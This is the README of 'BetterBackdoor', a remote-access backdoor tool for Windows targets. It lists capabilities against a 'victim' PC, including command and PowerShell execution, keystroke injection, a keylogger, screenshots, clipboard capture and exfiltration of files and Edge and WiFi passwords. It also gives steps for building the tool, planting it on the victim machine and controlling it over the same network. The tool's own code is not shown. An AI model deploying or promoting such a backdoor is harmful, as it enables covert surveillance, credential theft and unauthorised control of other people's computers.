# BetterBackdoor
A backdoor is a program run on a machine that is used to remotely gain access and controll to that machine.

Typically, backdoor utilities such as Netcat have 2 main functions, to pipe remote input into cmd or bash, and output the response.
This is useful, but it is also limited.
BetterBackdoor overcomes these limitations by including the ability to inject keystrokes, get screenshots, transfer files, and many other tasks.

## Features
BetterBackdoor can create and controll a backdoor.

This created backdoor can:
- Run Command Prompt commands
- Run PowerShell scripts
- Run DuckyScripts to inject keystrokes
- Exfiltrate files based on extension
- Exfiltrate Microsoft Edge and WiFi passwords
- Send and receive files to and from victim's computer
- Start a KeyLogger
- Get a screenshot of victim's computer
- Get text copied to victim's clipboard
- Get data from a victim's file (cat)

To create the backdoor, BetterBackdoor:
- Copies backdoor jar file to a new directory called 'backdoor' in the current working direcotry.
- If desired, copies a Java Runtime Environment to 'backdoor' and creates batch file 'run.bat 'for running the backdoor in the packaged Java Runtime Environment.
- Copies all '.duck' DuckyScripts and '.ps1' PowerShell scripts to 'backdoor'.

To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.

If you packaged a JRE with the backdoor, execute run.bat, otherwise execute run.jar. 

This will start the backdoor on the victim's PC.

Once running, to control the backdoor you must return to BetterBackdoor and run option 1 at start while connected to the same WiFi network as the victim's computer.

## Requirements
- A Java JDK distribution must be installed and added to PATH.
- You must use the same computer to create and control the backdoor.
  - The computer used to create the backdoor must be on the same WiFi network as the victim's computer.
  - The IPv4 address of this computer must remain static in the time between creating the backdoor and controlling it.
- The computer used to control the backdoor must have their firewall deactivated and must run BetterBackdoor as 'sudo' (if run on Mac or Linux).

## Compatibility
BetterBackdoor is compatible with Windows, Mac, and Linux, while the backdoor is only compatible with Windows.

## Installation
```
# clone BetterBackdoor
git clone https://github.com/ThatcherDev/BetterBackdoor.git

# change the working directory to BetterBackdoor
cd BetterBackdoor

# build BetterBackdoor with Maven
# for Windows run
mvnw.cmd clean package

# for Linux run
chmod +x mvnw
./mvnw clean package

# for Mac run
sh mvnw clean package
```

## Usage
```
# run BetterBackdoor
java -jar betterbackdoor.jar
```

## License
- [MIT](https://choosealicense.com/licenses/mit/)
- Copyright 2019 © ThatcherDev.
